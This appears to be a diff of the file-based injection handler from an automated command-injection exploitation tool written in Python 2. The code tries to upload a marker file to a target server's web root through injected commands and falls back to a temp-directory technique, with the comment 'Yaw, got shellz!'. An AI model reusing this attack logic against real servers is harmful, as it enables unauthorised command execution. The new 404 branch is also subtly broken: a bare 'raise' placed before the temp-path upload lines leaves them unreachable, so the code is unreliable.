@@ -62,7 +62,27 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   output_file.write("\n(+) Type : " + injection_type)
   output_file.write("\n(+) Technique : " + technique.title())
   output_file.close()
+  
+  # Change TAG on every request to prevent false-positive resutls.
+  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
+
+  # Check if defined "--base64" option.
+  if menu.options.base64_trick == True:
+    B64_ENC_TAG = base64.b64encode(TAG)
+    B64_DEC_TRICK = settings.B64_DEC_TRICK
+  else:
+    B64_ENC_TAG = TAG
+    B64_DEC_TRICK = ""
     
+  # The output file for file-based injection technique.
+  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+  
+  if menu.options.srv_root_dir:
+    SRV_ROOT_DIR = menu.options.srv_root_dir
+  else:
+    SRV_ROOT_DIR = settings.SRV_ROOT_DIR
+  sys.stdout.write("\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
+  sys.stdout.flush()
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
@@ -71,29 +91,8 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	combination = prefix + separator
 	if combination in settings.JUNK_COMBINATION:
 	  prefix = ""
-	
-	# Change TAG on every request to prevent false-positive resutls.
-	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
-	
-	# Check if defined "--base64" option.
-	if menu.options.base64_trick == True:
-	  B64_ENC_TAG = base64.b64encode(TAG)
-	  B64_DEC_TRICK = settings.B64_DEC_TRICK
-	else:
-	  B64_ENC_TAG = TAG
-	  B64_DEC_TRICK = ""
-	  
-	# The output file for file-based injection technique.
-	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
-	
-	if menu.options.srv_root_dir:
-	  SRV_ROOT_DIR = menu.options.srv_root_dir
-	else:
-	  SRV_ROOT_DIR = settings.SRV_ROOT_DIR
-	  
-	sys.stdout.write( "\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
+	 	
 	try:
-	  
 	  # File-based decision payload (check if host is vulnerable).
 	  payload = fb_payloads.decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)
 		  
@@ -142,27 +141,33 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  # If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
 	  except urllib2.HTTPError, e:
 	      if e.getcode() == 404:
-		
-		stop_injection = True
-		if menu.options.tmp_path:
-		  tmp_path = menu.options.tmp_path
+		print "[" + colors.RED + " FAILED "+colors.RESET+"]"
+		tmp_upload = raw_input("(*) Do you want to upload file, on temporary directory [Y/n] > ")
+		if tmp_upload == "Y" or tmp_upload == "y":
+		  raise
+		  if menu.options.tmp_path:
+		    tmp_path = menu.options.tmp_path
+		  else:
+		    tmp_path = settings.TMP_PATH
+		  sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
+		  tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
+		  sys.exit(0)
 		else:
-		  tmp_path = settings.TMP_PATH
-		  
-		print colors.BGRED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET + ""
-		sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on temporary directory (" + tmp_path + ")...\n")
-		tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
+		  continue
+	      elif e.getcode() == 401:
+		print colors.BGRED + "(x) Error: Authorization required!" + colors.RESET + "\n"
 		sys.exit(0)
 		
-	  except urllib2.URLError, e:
-	      print colors.BGRED + "(x) Error: The host seems to be down!" + colors.RESET
-	      sys.exit(0)
+	      elif e.getcode() == 403:
+		print colors.BGRED + "(x) Error: You don't have permission to access this page." + colors.RESET + "\n"
+		sys.exit(0)
 			  
-	except:
-	  if stop_injection:
-	    raise
-	  else:
-	    continue
+	except KeyboardInterrupt: 
+	  raise
+	
+	except urllib2.URLError, e:
+	  print "\n" + colors.BGRED + "(x) Error: " + e.reason + colors.RESET + ""
+	  sys.exit(0)
 	  
 	# Yaw, got shellz! 
 	# Do some magic tricks!
